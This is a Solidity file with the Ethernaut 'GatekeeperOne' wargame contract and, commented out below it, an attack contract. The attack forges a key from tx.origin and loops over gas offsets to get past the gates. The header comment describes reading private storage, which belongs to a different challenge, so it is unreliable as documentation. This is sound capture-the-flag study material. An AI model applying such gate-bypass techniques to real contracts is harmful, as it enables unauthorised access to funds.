// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title GarekeeperOne
/// @author OpenZeppelin
/// @notice Read storage and cast
///         Read storage with ethers or web3js for ex. and then cast the bytes32 data to bytes16
///         Once again, nothing on the blockchain is truly private
///         getStorageAt(), can easily get data from a contract
///         It can be complicated due to the fact that there can be data slot optimizations (32bytes)
///         

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// Attack used for gatekeeper, #### GO THROUGH AGAIN
// pragma solidity ^0.6.0;

// contract GatekeeperOneAttack {

//   constructor(address GatekeeperOneContractAddress) public {
//     bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
    
//     // NOTE: the proper gas offset to use will vary depending on the compiler
//     // version and optimization settings used to deploy the factory contract.
//     // To migitage, brute-force a range of possible values of gas to forward.
//     // Using call (vs. an abstract interface) prevents reverts from propagating.
//     bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
//       key
//     );

//     // gas offset usually comes in around 210, give a buffer of 60 on each side
//     for (uint256 i = 0; i < 120; i++) {
//       (bool result, ) = address(GatekeeperOneContractAddress).call{gas: i + 150 + 8191 * 3}(encodedParams);
//       if(result)
//         {
//         break;
//       }
//     }
//   }
// }